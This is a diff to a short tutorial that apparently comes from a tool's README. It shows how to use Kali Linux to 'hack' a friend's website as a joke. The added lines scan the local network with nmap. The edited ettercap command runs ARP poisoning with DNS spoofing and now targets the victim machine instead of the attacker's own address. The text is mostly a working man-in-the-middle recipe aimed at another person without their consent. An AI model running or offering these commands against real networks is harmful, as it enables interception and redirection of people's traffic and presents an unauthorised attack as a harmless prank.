@@ -6,6 +6,18 @@
 ### Kali usage example:
 Let's say you want to make a joke with your friend and "hack" his web-site.  
 We wil use [Kali linux](https://www.kali.org/).
+
+Look your ip
+```
+ifconfig
+```
+let your ip is 192.168.0.30
+
+Scan network:
+```
+nmap -sn 192.168.0.0/24
+```
+let:
 - 192.168.0.1 - gateway  
 - 192.168.0.20 - victim  
 - 192.168.0.30 - your ip  
@@ -26,5 +38,5 @@ www.example.com PTR 192.168.0.30
 ...
 ```
 ```
-ettercap -T -q -i wlan0 -M arp:remote -P dns_spoof /192.168.0.1// /192.168.0.30//
+ettercap -T -q -i wlan0 -M arp:remote -P dns_spoof /192.168.0.1// /192.168.0.20//
 ```
